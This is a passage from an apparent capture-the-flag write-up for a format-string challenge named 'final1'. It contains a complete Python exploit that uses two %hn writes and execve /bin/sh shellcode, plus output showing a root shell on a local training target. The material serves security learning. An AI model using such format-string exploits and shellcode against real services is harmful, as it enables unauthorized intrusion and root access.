we need to split the address up and do 2 writes, with %hn . We have our offsets from earlier testing. The tricky part now was getting the x and y values which will determine what is written to those locations by %n by providing a "bytes written" value. The method on codearcana didnt work out for me on this challenge, probably because there is the "Login from 127.0.0.1:56418 as [x] with password" , so I basically threw in a number for y and saw what was written to address+2. I then calced the dif, and modified the value accordingly until i got what i needed! Theres probably a more "scientific" method to go about this, but I was ready to get this done ;)

After some testing , I ended up with the following values for my system. I could then throw shellcode on the end and jump to where it sat on the stack, and was able to get a shell!

### Python exploit:

```python 
#! /usr/bin/python
import socket
import struct
import telnetlib

try:
    print("[*]Connecting to target")
    #create socket obj
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #connect the client
    client.connect ( ('127.0.0.1',2994))
    target= 0x804a170
    client.send("username i\n")
    p = "login ###" 
    p += struct.pack('<I', target) #target loc
    p += struct.pack('<I', target+2)
    p+= "%54992"  #val to write 0xd70c
    p +="x%20$hn" #offset to hit target loc on stack
    p +="%10483"  #value to write 0xffff
    p +="x%21$hn " #stack offset+1
    p += "\x31\xc0\x50\x68\x2f\x2f\x73"  #some shellcode
    p += "\x68\x68\x2f\x62\x69\x6e\x89"
    p += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
    p += "\xcd\x80\x31\xc0\x40\xcd\x80"
    p += '\n'
    raw_input("Press Enter to send payload")
    print("[*]Sending Payload ")
    client.send(p)
    client.send("username x\n") #this will make us hit strcpy, which now jumps to shellcode!
    print("enjoy your shell")
    #interact w shell
   
    t = telnetlib.Telnet()
    t.sock = client
 
    t.interact()
except socket.errno:
    raise
```

### winning command:

```zsh
➜  binaries git:(master) ✗ ./final1.py 
[*]Connecting to target
Press Enter to send payload
[*]Sending Payload 
enjoy your shell
[final1] $ [final1] $ login failed
[final1] $ whoami
root
```
